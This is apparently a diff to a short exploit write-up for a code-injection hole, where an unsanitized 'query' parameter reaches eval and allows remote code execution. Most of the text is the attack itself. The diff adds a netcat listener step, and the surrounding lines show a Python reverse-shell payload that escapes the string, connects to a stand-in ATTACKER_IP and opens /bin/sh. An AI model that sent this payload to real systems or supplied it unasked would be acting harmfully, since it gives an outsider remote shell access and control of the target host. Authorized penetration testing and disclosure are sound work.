@@ -15,10 +15,13 @@ url = eval(
 
 If user parameter `query` is not sanitized it leads to RCE.
 
+
 * Exploit code for linux target
 
+1. Prepare a listener: `nc -lvnp PORT`
+2. send this as query parameter to the tested host
+
 ```
-#send this as query parameter
 
 ', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
 
